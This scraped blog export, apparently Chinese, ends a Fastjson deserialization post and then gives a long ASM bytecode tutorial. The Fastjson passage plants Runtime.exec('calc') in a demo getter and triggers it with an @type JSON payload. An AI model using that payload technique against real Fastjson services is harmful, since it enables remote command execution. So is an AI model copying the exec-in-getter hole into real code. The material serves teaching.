该类的构造函数、setter方法、getter方法中的某一个存在危险操作，比如造成命令执行； 可以控制该漏洞函数的变量（一般就是该类的属性）； 漏洞demo由前面比较的案例知道，当反序列化指定的类型是Object.class，即代码为Object obj = JSON.parseObject(jsonstring, Object.class, Feature.SupportNonPublicField);时，反序列化过程中会调用类的构造函数、所有属性的setter方法、私有属性的getter方法，因此我们这里直接做最简单的修改，将Student类中会被调用的getter方法添加漏洞代码，这里修改getProperties()作为演示： 123456789101112131415161718192021222324252627282930313233343536public class StudentDemo &#123; private String name; private int age; private String address; private Properties properties; public StudentDemo() &#123; System.out.println(\"构造函数\"); &#125; public String getName() &#123; System.out.println(\"getName\"); return name; &#125; public void setName(String name) &#123; System.out.println(\"setName\"); this.name = name; &#125; public int getAge() &#123; System.out.println(\"getAge\"); return age; &#125; public String getAddress() &#123; System.out.println(\"getAddress\"); return address; &#125; public Properties getProperties() throws Exception &#123; System.out.println(\"getProperties\"); Runtime.getRuntime().exec(\"calc\"); return properties; &#125;&#125; 触发代码： 1234String jsonstring =\"&#123;\\\"@type\\\":\\\"fastjson2change.StudentDemo\\\",\\\"age\\\":18,\\\"name\\\":\\\"0range\\\",\\\"address\\\":\\\"China\\\",\\\"properties\\\":&#123;&#125;&#125;\"; Object obj = JSON.parseObject(jsonstring, Object.class, Feature.SupportNonPublicField); System.out.println(obj); System.out.println(obj.getClass().getName()); 结果成功触发： 很明显，前面的Demo中反序列化的类是一个Object类，该类是任意类的父类，其子类Student存在Fastjson反序列化漏洞，当@type指向Student类是反序列化就会触发漏洞。 对于另一种反序列化指定类的情景，是该指定类本身就存在漏洞，比如我们将上述Demo中反序列化那行代码改成直接反序列化得到Student类而非Object类，这样就是另一个触发也是最直接的触发场景： 1StudentDemo obj = JSON.parseObject(jsonstring, StudentDemo.class, Feature.SupportNonPublicField); 触发场景； 这一篇先写到这里，下一篇讲讲Fastjson的漏洞时间线。 参考博客","categories":[{"name":"Java","slug":"Java","permalink":"https://0range228.github.io/categories/Java/"}],"tags":[{"name":"Fastjson","slug":"Fastjson","permalink":"https://0range228.github.io/tags/Fastjson/"}]},{"title":"ASM笔记","slug":"ASM笔记","date":"2020-05-09T06:43:36.000Z","updated":"2020-11-12T02:55:17.992Z","comments":true,"path":"ASM笔记/","link":"","permalink":"https://0range228.github.io/ASM%E7%AC%94%E8%AE%B0/","excerpt":"序言 累土而不辍，丘山崇成。 今天来学习磨人的ASM框架。","text":"序言 累土而不辍，丘山崇成。 今天来学习磨人的ASM框架。 简介ASM 是一个 Java 字节码操控框架。它能被用来动态生成类或者增强既有类的功能。ASM 可以直接产生二进制 class 文件，也可以在类被加载入 Java 虚拟机之前动态改变类行为。Java class 被存储在严格格式定义的 .class 文件里，这些类文件拥有足够的元数据来解析类中的所有元素：类名称、方法、属性以及 Java 字节码（指令）。ASM 从类文件中读入信息后，能够改变类行为，分析类信息，甚至能够根据用户要求生成新类。 简单的说，ASM可以读取解析class文件内容，并提供接口让你可以对class文件字节码内容进行CRUD操作。 注: class文件存储的是java字节码，ASM 是对java字节码操作的一层封装，因此，如果你很了解 class文件格式的话，你甚至可以通过直接使用文本编辑器（eg:Vim）来改写class文件。 知道了 ASM 的作用后，接下来就来看下 ASM 的执行模式。 ASM框架执行流程ASM 提供了两组API：Core和Tree： Core是基于访问者模式来操作类的 Tree是基于树节点来操作类的 本文我们主要讨论的是 ASM 的 CoreAPI。 ASM 内部采用 访问者模式 将 .class 类文件的内容从头到尾扫描一遍，每次扫描到类文件相应的内容时，都会调用ClassVisitor内部相应的方法。 比如： 扫描到类文件时，会回调ClassVisitor的visit()方法； 扫描到类注解时，会回调ClassVisitor的visitAnnotation()方法； 扫描到类成员时，会回调ClassVisitor的visitField()方法； 扫描到类方法时，会回调ClassVisitor的visitMethod()方法； ······ 扫描到相应结构内容时，会回调相应方法，该方法会返回一个对应的字节码操作对象（比如，visitMethod()返回MethodVisitor实例），通过修改这个对象，就可以修改class文件相应结构部分内容，最后将这个ClassVisitor字节码内容覆盖原来.class文件就实现了类文件的代码切入。 具体关系如下： 树形关系 使用的接口 Class ClassVisitor Field FieldVisitor Method MethodVisitor Annotation AnnotationVisitor 整个具体的执行时序如下图所示： 通过时序图可以看出ASM在处理class文件的整个过程。ASM通过树这种数据结构来表示复杂的字节码结构，并利用 Push模型 来对树进行遍历。 ASM 中提供一个ClassReader类，这个类可以直接由字节数组或者class文件间接的获得字节码数据。它会调用accept()方法，接受一个实现了抽象类ClassVisitor的对象实例作为参数，然后依次调用ClassVisitor的各个方法。字节码空间上的偏移被转成各种visitXXX方法。使用者只需要在对应的的方法上进行需求操作即可，无需考虑字节偏移。 这个过程中ClassReader可以看作是一个事件生产者，ClassWriter继承自ClassVisitor抽象类，负责将对象化的class文件内容重构成一个二进制格式的class字节码文件，ClassWriter可以看作是一个事件的消费者。 通常，cr.accept(cvv, skip_Debug). cvv通常是来继承ClassVistor的一个类的实例，这个类里面通常重载ClassVisitor的一系列方法，实现我们自己的操作。 接下来还剩的一点内容就是如何实现class文件字节码的修改。 ASM字节码修改由于 ASM 是直接对class文件的字节码进行操作，因此，要修改class文件内容时，也要注入相应的java字节码。 所以，在注入字节码之前，我们还需要了解下class文件的结构，JVM指令等知识。 Class文件结构 Java源文件经过javac编译器编译之后，将会生成对应的二进制.class文件，如下图所示： Java类文件是 8 位字节的二进制流。数据项按顺序存储在class文件中，相邻的项之间没有间隔，这使得class文件变得紧凑，减少存储空间。在Java类文件中包含了许多大小不同的项，由于每一项的结构都有严格规定，这使得 class 文件能够从头到尾被顺利地解析。 每个class文件都是有固定的结构信息，而且保留了源码文件中的符号。下图是class文件的格式图。其中带 * 号的表示可重复的结构。 类结构体中所有的修饰符、字符常量和其他常量都被存储在class文件开始的一个常量堆栈(Constant Stack)中，其他结构体通过索引引用。 每个类必须包含headers（包括：class name, super class, interface, etc.）和常量堆栈（Constant Stack）其他元素，例如：字段（fields）、方法（methods）和全部属性（attributes）可以选择显示或者不显示。 每个字段块（Field section）包括名称、修饰符（public, private, etc.）、描述符号(descriptor)和字段属性。 每个方法区域（Method section）里面的信息与header部分的信息类似，信息关于最大堆栈（max stack）和最大本地变量数量（max local variable numbers）被用于修改字节码。对于非abstract和非native的方法有一个方法指令表，exceptions表和代码属性表。除此之外，还可以有其他方法属性。 每个类、字段、方法和方法代码的属性有属于自己的名称记录在类文件格式的JVM规范的部分，这些属性展示了字节码多方面的信息，例如源文件名、内部类、签名、代码行数、本地变量表和注释。JVM规范允许定义自定义属性，这些属性会被标准的VM（虚拟机）忽略，但是可以包含附件信息。 方法代码表包含一系列对java虚拟机的指令。有些指令在代码中使用偏移量，当指令从方法代码被插入或者移除时，全部偏移量的值可能需要调整。 Java类型与Class文件内部类型对应关系Java类型分为基本类型和引用类型，在 JVM 中对每一种类型都有与之相对应的类型描述，如下表： Java type JVM Type descriptor boolean Z char C byte B short S int I float F long J double D Object Ljava/lang/Object; int[] [I Object[][] [[Ljava/lang/Object; 在 ASM 中要获得一个类的 JVM 内部描述，可以使用org.objectweb.asm.Type类中的getDescriptor(final Class c)方法，如下： 123456public class TypeDescriptors &#123; public static void main(String[] args) &#123; System.out.println(Type.getDescriptor(TypeDescriptors.class)); System.out.println(Type.getDescriptor(String.class)); &#125; &#125; 运行结果： 12Lorg/victorzhzh/core/structure/TypeDescriptors; Ljava/lang/String; Java方法声明与Class内部声明的对应关系在·Java·的二进制文件中，方法的方法名和方法的描述都是存储在Constant pool 中的，且在两个不同的单元里。因此，方法描述中不含有方法名，只含有参数类型和返回类型。 格式：(参数描述符)返回值描述符 Method declaration in source file Method descriptor void m(int i, float f) (IF)V int m(Object o) (Ljava/lang/Object;)I int[] m(int i, String s) (ILjava/lang/String;)[I Object m(int[] i) ([I]Ljava/lang/Object; String m() ()Ljava/lang/String; JVM指令假设现在我们有如下一个类： 先用javac com/yn/test/Test.java编译得到Test.class文件，然后再使用javap -c com/yn/test/Test来查看下这个Test.class文件的字节码，结果如下图所示： 上图中第3行到第7行，是类Test的默认构造函数（由编译器默认生成），Code以下部分是构造函数内部代码，其中： aload_0： 这个指令是LOAD系列指令中的一个，它的意思表示装载当前第 0 个元素到堆栈中。代码上相当于this。而这个数据元素的类型是一个引用类型。这些指令包含了：ALOAD，ILOAD，LLOAD，FLOAD，DLOAD。区分它们的作用就是针对不用数据类型而准备的LOAD指令，此外还有专门负责处理数组的指令 SALOAD。 invokespecial： 这个指令是调用系列指令中的一个。其目的是调用对象类的方法。后面需要给上父类的方法完整签名。“#1”的意思是 .class 文件常量表中第1个元素。值为：“java/lang/Object.”“:()V”。结合ALOAD_0。这两个指令可以翻译为：“super()”。其含义是调用自己的父类构造方法。 第9到14行是main方法，Code以下是其字节码表示： getstatic： 这个指令是GET系列指令中的一个其作用是获取静态字段内容到堆栈中。这一系列指令包括了：GETFIELD、GETSTATIC。它们分别用于获取动态字段和静态字段。此处表示的意思获取静态成员System.out到堆栈中。 ldc：这个指令的功能是从常量表中装载一个数据到堆栈中。此处表示从常量池中获取字符串”Hello World!”。 invokevirtual：也是一种调用指令，这个指令区别与 invokespecial 的是它是根据引用调用对象类的方法。此处表示调用java.io.PrintStream.println(String)方法，结合前面的操作，这里调用的就是System.out.println(&quot;Hello World!&quot;)。 return： 这也是一系列指令中的一个，其目的是方法调用完毕返回：可用的其他指令有：IRETURN，DRETURN，ARETURN等，用于表示不同类型参数的返回。 接下来，我们就可以根据上面所讲的内容，将代码字节码注入到class文件中了。 现在假设我们想要在类Test的main方法前后动态插入代码，如下所示： 要完成在main方法前后插入输出代码，需要以下几步操作： 读取Test.class文件，可以通过 ASM 提供的ClassReader类进行class文件的读取与遍历。 1234567891011// 使用全限定名，创建一个ClassReader对象ClassReader classReader = new ClassReader(\"com.yn.test.Test\");// 构建一个ClassWriter对象，并设置让系统自动计算栈和本地变量大小ClassWriter classWriter = new ClassWriter(ClassWriter.COMPUTE_MAXS);//创建一个自定义ClassVisitor，方便后续ClassReader的遍历通知ClassVisitor classVisitor = new TestClassVisitor(classWriter);//开始扫描class文件classReader.accept(classVisitor, ClassReader.SKIP_DEBUG); 从javap反编译得到的字节码可以知道，实现System.out.println(&quot;Hello World!&quot;);的字节码总共需要3步操作： (1). 获取System静态成员out，其对应的指令为getstatic，对应的 ASM 代码为： 12345mv.visitFieldInsn(Opcodes.GETSTATIC, Type.getInternalName(System.class), //\"java/lang/System\" \"out\", Type.getDescriptor(PrintStream.class) //\"Ljava/io/PrintStream;\" ); (2). 获取字符串常量”Hello World!”，其对应的指令为ldc，对应的 ASM 代码为： 1mv.visitLdcInsn(\"Hello World!\"); (3). 获取PrintStream.println(String)方法，其对应的指令为invokervirtual，对应的 ASM 代码为： 12345mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL, Type.getInternalName(PrintStream.class), //\"java/io/PrintStream\" \"println\", \"(Ljava/lang/String;)V\",//方法描述符 false); 在main方法进入前，进行代码插入，可以通过MethodVisitor.visitCode()方法。 1234567// 在源方法前去修改方法内容,这部分的修改将加载源方法的字节码之前@Overridepublic void visitCode() &#123; mv.visitCode(); System.out.println(\"method start to insert code\"); sop(\"asm insert before\");//this is the insert code &#125; 在main方法退出前，进行代码插入，可以通关过MethodVisitor.visitInsn()方法，通过判断当前的指令为return时，表明即将执行return语句，此时插入字节码即可。 12345678910@Overridepublic void visitInsn(int opcode) &#123; //检测到return语句 if (opcode == Opcodes.RETURN) &#123; System.out.println(\"method end to insert code\"); sop(\"asm insert after\"); &#125; //执行原本语句 mv.visitInsn(opcode); &#125; 字节码插入class文件成功后，导出字节码到原文件中。 1234567//获取改写后的class二进制字节码byte[] classFile = classWriter.toByteArray();// 将这个类输出到原先的类文件目录下，这是原先的类文件已经被修改File file = new File(\"E:/code/Android/Projects/AsmButterknife/sample-java/build/classes/java/main/com/yn/test/Test.class\");FileOutputStream fos = new FileOutputStream(file);fos.write(classFile);fos.close(); 注: asm-commons 包中提供了一个类AdviceAdapter，使用该类可以更加方便的让我们在方法前后注入代码，因为其提供了方法onMethodEnter()和onMethodExit()。 通过上面介绍的内容，我们已经成功使用 ASM 动态注入字节码到class文件中。但是如果直接采用 ASM 代码注入字节码，还是相对困难的，幸运的是 ASM 给我们提供了 ASMifier 工具，使得我们可以直接通过.class文件反编译为 ASM 代码。 完整代码 ASM关键接口ClassVisitorClassVisitor，在 ASM3.0 中是一个接口，到了 ASM4.0 与 ClassAdapter 抽象类合并。主要负责 “拜访” 类成员信息。其中包括（标记在类上的注解，类的构造方法，类的字段，类的方法，静态代码块）,它的完整接口如下： visit(int , int , String , String , String , String[])该方法是当扫描类时第一个拜访的方法，主要用于类声明使用。下面是对方法中各个参数的示意：visit( 类版本 , 修饰符 , 类名 , 泛型信息 , 继承的父类 , 实现的接口**)。例如： 12345public class TestBean &#123;等价于：visit(V1_6, ACC_PUBLIC | ACC_SUPER , \"org/more/test/asm/simple/TestBean\", null, \"java/lang/Object\", null) 第一个参数：表示类版本：V1_6，表示 “.class” 文件的版本是 JDK 1.6。可用的其他版本有：V1_1（JRE_1.1）、V1_2（J2SE_1.2）、V1_3（J2SE_1.3）、V1_4（J2SE_1.4）、V1_5（J2SE_1.5）、V1_6（JavaSE_1.6）、V1_7（JavaSE_1.7）。我们所指的 JDK 6 或 JDK 7 实际上就是只 JDK 1.6 或 JDK 1.7。 第二个参数：表示类的修饰符：修饰符在 ASM 中是以 “ACC_” 开头的常量进行定义。可以作用到类级别上的修饰符有：ACC_PUBLIC（public）、ACC_PRIVATE（private）、ACC_PROTECTED（protected）、ACC_FINAL（final）、ACC_SUPER（extends）、ACC_INTERFACE（接口）、ACC_ABSTRACT（抽象类）、ACC_ANNOTATION（注解类型）、ACC_ENUM（枚举类型）、ACC_DEPRECATED（标记了@Deprecated注解的类）、ACC_SYNTHETIC。 第三个参数：表示类的名称：通常我们的类完整类名使用 “org.test.mypackage.MyClass” 来表示，但是到了字节码中会以路径形式表示它们 “org/test/mypackage/MyClass” 值得注意的是虽然是路径表示法但是不需要写明类的 “.class” 扩展名。 第四个参数：表示泛型信息，如果类并未定义任何泛型该参数为空。Java 字节码中表示泛型时分别对接口和类采取不同的定义。该参数的内容格式如下： 123&lt;泛型名:基于的类型....&gt;Ljava/lang/Object;&lt;泛型名::基于的接口....&gt;Ljava/lang/Object; 其中 “泛型名:基于的类型” 内容可以无限的写下去，例如： 12345678910public class TestBean&lt;T,V,Z&gt; &#123;泛型参数为：&lt;T:Ljava/lang/Object;V:Ljava/lang/Object;Z:Ljava/lang/Object;&gt;Ljava/lang/Object;分析结构如下： &lt; T:Ljava/lang/Object; V:Ljava/lang/Object; Z:Ljava/lang/Object; &gt; Ljava/lang/Object; 再或者： 123456789public class TestBean&lt;T extends Date, V extends ArrayList&gt; &#123;泛型参数为：&lt;T:Ljava/util/Date;V:Ljava/util/ArrayList;&gt;Ljava/lang/Object;分析结构如下： &lt; T:Ljava/util/Date; V:Ljava/util/ArrayList; &gt; Ljava/lang/Object; 以上内容只是针对泛型内容是基于某个具体类型的情况，如果泛型是基于接口而非类型则定义方式会有所不同，这一点需要注意。例如： 123456789public class TestBean&lt;T extends Serializable, V&gt; &#123;泛型参数为：&lt;T::Ljava/io/Serializable;V:Ljava/lang/Object;&gt;Ljava/lang/Object;分析结构如下： &lt; T::Ljava/io/Serializable; //比类型多出一个“:” V:Ljava/lang/Object; &gt; Ljava/lang/Object; 第五个参数：表示所继承的父类。由于 Java 的类是单根结构，即所有类都继承自 java.lang.Object 因此可以简单的理解为任何类都会具有一个父类。虽然在编写 Java 程序时我们没有去写 extends 关键字去明确继承的父类，但是 JDK在编译时 总会为我们加上 “ extends Object”。所以倘若某一天你看到这样一份代码也不要过于紧张。 第六个参数：表示类实现的接口，在 Java 中类是可以实现多个不同的接口因此此处是一个数组例如： 123public class TestBean implements Serializable , List &#123;该参数会以 “[java/io/Serializable, java/util/List]” 形式出现。 这里需要补充一些内容，如果类型其本身就是接口类型。对于该方法而言，接口的父类类型是 “java/lang/Object”，接口所继承的所有接口都会出现在第六个参数中。例如： 1234public inteface TestBean implements Serializable , List &#123;最后两个参数对应为: \"java/lang/Object\", [\"java/io/Serializable\",\"java/util/List\"] visitAnnotation(String , boolean)该方法是当扫描器扫描到类注解声明时进行调用。下面是对方法中各个参数的示意：visitAnnotation(注解类型 , 注解是否可以在 JVM 中可见)。例如： 12345@Bean(&#123; \"\" &#125;)public class TestBean &#123;@Bean等价于： visitAnnotation(\"Lnet/hasor/core/gift/bean/Bean;\", true); 下面是 @Bean 的源代码： 123456@Retention(RetentionPolicy.RUNTIME)@Target(&#123; ElementType.TYPE &#125;)public @interface Bean &#123; /** Bean名称。*/ public String[] value();&#125; 12345678910public AnnotationVisitor visitAnnotation(final String descriptor, final boolean visible) &#123; if (cv != null) &#123; return cv.visitAnnotation(descriptor, visible); &#125; return null;&#125;descriptor:表示类注解类的描述；visible表示该注解是否运行时可见；return AnnotationVisitor:表示该注解类的Visitor，可以用来访问注解值； 第一个参数：表示的是，注解的类型。它使用的是（“L” + “类型路径” + “;”）形式表述。 第二个参数：表示的是，该注解是否在 JVM 中可见。这个参数的具体含义可以理解为：如果为 true 表示虚拟机可见，我们可以通过下面这样的代码获取到注解类型： 1testBeanType.getAnnotation(TestAnno.class); 谈到这里就需要额外说明一下在声明注解时常见的 “@Retention(RetentionPolicy.RUNTIME)” 标记。RetentionPolicy 是一个枚举它具备三个枚举元素其每个含义可以理解为： RetentionPolicy.SOURCE：声明注解只保留在 Java 源程序中，在编译 Java 类时注解信息不会被写入到 Class。如果使用的是这个配置 ASM 也将无法探测到这个注解。 RetentionPolicy.CLASS：声明注解仅保留在 Class 文件中，JVM 运行时并不会处理它，这意味着 ASM 可以在 visitAnnotation 时候探测到它，但是通过Class 反射无法获取到注解信息。 RetentionPolicy.RUNTIME：这是最常用的一种声明，ASM 可以探测到这个注解，同时 Java 反射也可以取得注解的信息。所有用到反射获取的注解都会用到这个配置，就是这个原因。 visitField(int , String , String , String , Object)该方法是当扫描器扫描到类中字段时进行调用。下面是对方法中各个参数的示意：visitField(修饰符 , 字段名 , 字段类型 , 泛型描述 , 默认值)。例如： 123456789101112131415161718192021public class TestBean &#123; private String stringData;stringData字段等价于： visitField(ACC_PRIVATE, \"stringData\", \"Ljava/lang/String;\", null, null) public FieldVisitor visitField( final int access, final String name, final String descriptor,final String signature, final Object value) &#123; if (cv != null) &#123; return cv.visitField(access, name, descriptor, signature, value); &#125; return null;&#125;其中access：表示该域的访问方式，public，private或者static,final等等；name：指的是域的名称；descriptor:域的描述,一般指的是该field的参数类型;signature:指的是域的签名，一般是泛型域才会有签名;value:指的该域的初始值reture FiedVisitor:表示将返回一个可以访问该域注解和属性的访问对象，如果不感兴趣的话，可以设置为空; access：表示字段的修饰符，修饰符在 ASM 中是以 “ACC_” 开头的常量进行定义。可以作用到字段级别上的修饰符有：ACC_PUBLIC（public）、ACC_PRIVATE（private）、ACC_PROTECTED（protected）、ACC_STATIC（static）、ACC_FINAL（final）、ACC_VOLATILE（volatile）、ACC_TRANSIENT（transient）、ACC_ENUM（枚举）、ACC_DEPRECATED（标记了@Deprecated注解的字段）、ACC_SYNTHETIC。 name：表示field的名称。 descriptor：表示field的参数类型，类的描述，其格式为：（“L” + 类型路径 + “;”）。 signature：表示泛型信息， 泛型类型描述是使用（“T” + 泛型名 + “;”）加以说明。例如：“private T data;” 字段的泛型描述将会是 “ TT; ”， “ private V data; ” 字段的泛型描述将会是 “ TV; ”。例如： 123456789101112public class TestBean&lt;T, V&gt; &#123; private T data; private V value;等价于：visit(V1_6, ACC_PUBLIC | ACC_SUPER , \"org/more/test/asm/simple/TestBean\", \"&lt;T:Ljava/lang/Object;V:Ljava/lang/Object;&gt;Ljava/lang/Object;\", //定义了两个泛型类型 T 和 V \"java/lang/Object\", null)visitField(ACC_PRIVATE, \"data\", \"Ljava/lang/Object;\", \"TT;\", null) //data 泛型名称为 TvisitField(ACC_PRIVATE, \"value\", \"Ljava/lang/Object;\", \"TV;\", null) // value 泛型名称为 V 还有一种情况，倘若类在定义泛型时候已经基于某个类型那么生成的代码将会是如下形式： 123456789101112public class TestBean&lt;T extends Serializable, V&gt; &#123; private T data; private V value;等价于：visit(V1_6, ACC_PUBLIC | ACC_SUPER , \"org/more/test/asm/simple/TestBean\", \"&lt;T::Ljava/io/Serializable;V:Ljava/lang/Object;&gt;Ljava/lang/Object;\", //定义了两个泛型类型 T 和 V \"java/lang/Object\", null)visitField(ACC_PRIVATE, \"data\", \"Ljava/io/Serializable;\", \"TT;\", null) //data 泛型名称为 TvisitField(ACC_PRIVATE, \"value\", \"Ljava/lang/Object;\", \"TV;\", null) // value 泛型名称为 V value：表示的是默认值， 由于默认值是 Object 类型大家可能以为可以是任何类型。这里要澄清一下，默认值中只能用来表述 Java 基本类型这其中包括了（byte、sort、int、long、float、double、boolean、String）其他所有类型都不可以进行表述。并且只有标有 “final” 修饰符的字段并且该字段赋有初值时这个参数才会有值。例如类： 123456public class TestBean &#123; private final String data; public TestBean() &#123; data = \"aa\"; &#125;.... 在执行 “visitField” 方法时候，这个参数的就是 null 值，下面这种代码也会是 null 值： 123456public class TestBean &#123; private final Date data; public TestBean() &#123; data =new Date(); &#125;.... 此外如果字段使用的是基本类型的包装类型，诸如：Integer、Long…也会为空值： 123public class TestBean &#123; private final Integer intData = 12;... 能够正确得到默认值的代码应该是这个样子的： 1234public class TestBean &#123; private final String data = \"ABC\"; private final int intData = 12;... visitMethod(int , String , String , String , String[])该方法是当扫描器扫描到类的方法时进行调用。下面是对方法中各个参数的示意：visitMethod(修饰符 , 方法名 , 方法签名 , 泛型信息 , 抛出的异常)。例如： 123456789101112131415161718public class TestBean &#123; public int halloAop(String param) throws Throwable &#123;等价于：visit(V1_6, ACC_PUBLIC | ACC_SUPER , \"org/more/test/asm/simple/TestBean\", null, \"java/lang/Object\", null)visitMethod(ACC_PUBLIC, \"&lt;init&gt;\", \"()V\", null, null)visitMethod(ACC_PUBLIC, \"halloAop\", \"(Ljava/lang/String;)I\", null, [java/lang/Throwable]) public MethodVisitor visitMethod( final int access,final String name,final String descriptor,final String signature, final String[] exceptions) &#123; if (cv != null) &#123; return cv.visitMethod(access, name, descriptor, signature, exceptions); &#125; return null;&#125; access：表示方法的修饰符，修饰符在 ASM 中是以 “ACC_” 开头的常量进行定义。可以作用到方法级别上的修饰符有：ACC_PUBLIC（public）、ACC_PRIVATE（private）、ACC_PROTECTED（protected）、ACC_STATIC（static）、ACC_FINAL（final）、ACC_SYNCHRONIZED（同步的）、ACC_VARARGS（不定参数个数的方法）、ACC_NATIVE（native类型方法）、ACC_ABSTRACT（抽象的）、ACC_DEPRECATED（标记了@Deprecated注解的方法）、ACC_STRICT、ACC_SYNTHETIC。 name：表示方法名，在 ASM 中 “visitMethod” 方法会处理（构造方法、静态代码块、私有方法、受保护的方法、共有方法、native类型方法）。在这些范畴中构造方法的方法名为 “”，静态代码块的方法名为 “”。列如： 1234567891011121314151617public class TestBean &#123; public int halloAop(String param) throws Throwable &#123; return 0; &#125; static &#123; System.out.println(); &#125;...等价于：visit(V1_6, ACC_PUBLIC | ACC_SUPER , \"org/more/test/asm/simple/TestBean\", null, \"java/lang/Object\", null)visitMethod(ACC_PUBLIC, \"&lt;clinit&gt;\", \"()V\", null, null)visitMethod(ACC_PUBLIC, \"&lt;init&gt;\", \"()V\", null, null)visitMethod(ACC_PUBLIC, \"halloAop\", \"(Ljava/lang/String;)I\", null, [java/lang/Throwable]) descriptor：表示方法签名，方法签名的格式如下：“(参数列表)返回值类型”。在字节码中不同的类型都有其对应的代码，如下所示： 12345678910111213\"I\" = int\"B\" = byte\"C\" = char\"D\" = double\"F\" = float\"J\" = long\"S\" = short\"Z\" = boolean\"V\" = void\"[...;\" = 数组\"[[...;\" = 二维数组\"[[[...;\" = 三维数组\"L....;\" = 引用类型 下面是一些方法签名对应的方法参数列表: signature：凡是具有泛型信息的方法，该参数都会有值。并且该值的内容信息基本等于第三个参数的拷贝，只不过不同的是泛型参数被特殊标记出来。例如： 12345public class TestBean&lt;T, V extends List&gt; &#123; public T halloAop(V abc, int aaa) throws Throwable &#123;方法签名：(Ljava/util/List;I)Ljava/lang/Object;泛型签名：(TV;I)TT; 12345public class TestBean&lt;T, V extends List&gt; &#123; public String halloAop(V abc, int aaa) throws Throwable &#123;方法签名：(Ljava/util/List;I)Ljava/lang/String;泛型签名：(TV;I)Ljava/lang/String; 可以看出泛型信息中用于标识泛型类型的结构是（“T” + 泛型名 + “;”），还有一种情况就是。泛型是声明在方法上。例如： 12345public class TestBean &#123; public &lt;T extends List&gt; String halloAop(T abc, int aaa) throws Throwable &#123;方法签名：(Ljava/util/List;I)Ljava/lang/String;泛型签名：&lt;T::Ljava/util/List;&gt;(TT;I)Ljava/lang/String; //泛型类型基于接口 12345public class TestBean &#123; public &lt;T&gt; String halloAop(T abc, int aaa) throws Throwable &#123;方法签名：(Ljava/lang/Object;I)Ljava/lang/String;泛型签名：&lt;T:Ljava/lang/Object;&gt;(TT;I)Ljava/lang/String; //泛型类型基于类型 exceptions：用来表示将会抛出的异常，如果方法不会抛出异常，则该参数为空。这个参数的表述形式比较简单，举一个例子： 1234public class TestBean &#123; public &lt;T&gt; String halloAop(T abc, int aaa) throws Throwable,Exception &#123;异常参数为：[java/lang/Throwable, java/lang/Exception] MethodVisitor假设有下面这样的一个类： 12345public class DemoClass &#123; public static void main(String[] args) &#123; System.out.println(); &#125;&#125; 通过Javap可以得到下面这样的输出： 12345678910111213141516$ javap -c classtest.DemoClassCompiled from \"DemoClass.java\"public class classtest.DemoClass extends java.lang.Object&#123;public classtest.DemoClass(); Code: 0: aload_0 1: invokespecial #8; //Method java/lang/Object.\"&lt;init&gt;\":()V 4: returnpublic static void main(java.lang.String[]); Code: 0: getstatic #16; //Field java/lang/System.out:Ljava/io/PrintStream; 3: invokevirtual #22; //Method java/io/PrintStream.println:()V 6: return&#125; 可以看出其实Java编译完这个类之后是产生了两个方法。其中一个是第四行表示的“public classtest.DemoClass();”它是构造方法。 和第十行表示的“main”方法。下面这段例子用来扫描这个类的这两个方法，我们的扫描逻辑很简单就是当遇到一个定义的方法时输出这个方法名。 123456789101112131415161718192021222324252627282930313233public class DemoClassTest &#123; public static void main(String[] args) throws IOException &#123; ClassReader cr = new ClassReader(DemoClass.class.getName()); cr.accept(new DemoClassVisitor(), ClassReader.SKIP_DEBUG); System.out.println(\"---ALL END---\"); &#125;&#125;class DemoClassVisitor extends ClassVisitor &#123; public DemoClassVisitor() &#123; super(Opcodes.ASM4); &#125; public MethodVisitor visitMethod(int access, String name, String desc, String signature, String[] exceptions) &#123; System.out.println(\"at Method \" + name); // MethodVisitor superMV = super.visitMethod(access, name, desc, signature, exceptions); return new DemoMethodVisitor(superMV, name); &#125;&#125;class DemoMethodVisitor extends MethodVisitor &#123; private String methodName; public DemoMethodVisitor(MethodVisitor mv, String methodName) &#123; super(Opcodes.ASM4, mv); this.methodName = methodName; &#125; public void visitCode() &#123; System.out.println(\"at Method ‘\" + methodName + \"’ Begin...\"); super.visitCode(); &#125; public void visitEnd() &#123; System.out.println(\"at Method ‘\" + methodName + \"’End.\"); super.visitEnd(); &#125;&#125; 上面这段程序首先在第三行使用 ClassReader 去读取 DemoClass 类的字节码信息。 其次通过“cr.accept(new DemoClassVisitor(), ClassReader.SKIP_DEBUG);”方法开始Visitor扫描整个字节码。 SKIP_DEBUG选项的意义是在扫描过程中掠过所有有关行号方面的内容。 在DemoClassVisitor类中我们重写了visitMethod方法，当遇到方法的时候打印出方法名。 随后我们返回DemoMethodVisitor对象，用以输出方法的开始和结束。 上面这段程序的输出如下： 1234567at Method &lt;init&gt;at Method ‘&lt;init&gt;’ Begin...at Method ‘&lt;init&gt;’End.at Method mainat Method ‘main’ Begin...at Method ‘main’End.---ALL END--- 下面是这个MethodVisitor接口的所有方法定义: 虽然该接口的方法数量如此之多，甚至是ClassVisitor接口的3倍以上。但是值得我们关心的接口只有下面这几个，其余的都是和代码有关系： 123MethodVisitor.visitCode();MethodVisitor.visitMaxs(maxStack, maxLocals);MethodVisitor.visitEnd(); 第一个方法：表示ASM开始扫描这个方法。 第二个方法：该方法是visitEnd之前调用的方法，可以反复调用。用以确定类方法在执行时候的堆栈大小。 第三个方法：表示方法输出完毕。 构造方法关于方法名或许读者注意到了在扫描这个类的时候，有一个特殊的方法被扫描到了“”，这个方法就是传说中的构造方法。当Java在编译的时候没有发现类文件中有构造方法的定义会为其创建一个默认的无参构造方法。这个“”就是那个由系统添加的构造方法。现在我们为类填写一个构造方法如下： 12345678public class DemoClass &#123; public DemoClass(int a) &#123; &#125; public static void main(String[] args) &#123; System.out.println(); &#125;&#125; 再次扫描这个类，你会发现它的结果和刚才是一样的，这是由于我们编写的构造方法替换了系统默认生成的那个。 静态代码块在Class我们接触过用“static { }”包含的代码，这个是我们常说的静态代码块。这个代码快ASM在扫描字节码的时候也会遇到它，别以为这真的是一个什么代码块。所有的静态代码快最后都会放到“”方法中。 静态代码快只有一个，现有下面这个的一个类。在编写这个类的时候我有意的写了两个不同的静态代码块的类： 12345678910111213public class DemoClass &#123; static &#123; int a; System.out.println(11); &#125; public static void main(String[] args) &#123; System.out.println(); &#125; static &#123; int a; System.out.println(22); &#125;&#125; ASM在扫描这个类的时候你会发现虽然类中存在多个静态代码快，但是最后类文件中只会出现了一个“”方法。JVM在编译Class的时候估计已经将多个静态代码块合并到一起了。 AccessPUBLIC: 1PRIVATE: 2PROTECTED: 4STATIC: 8FINAL: 16SYNCHRONIZED: 32VOLATILE: 64TRANSIENT: 128NATIVE: 256INTERFACE: 512ABSTRACT: 1024STRICT: 2048 Modifier提供了很多静态方法。如public static String 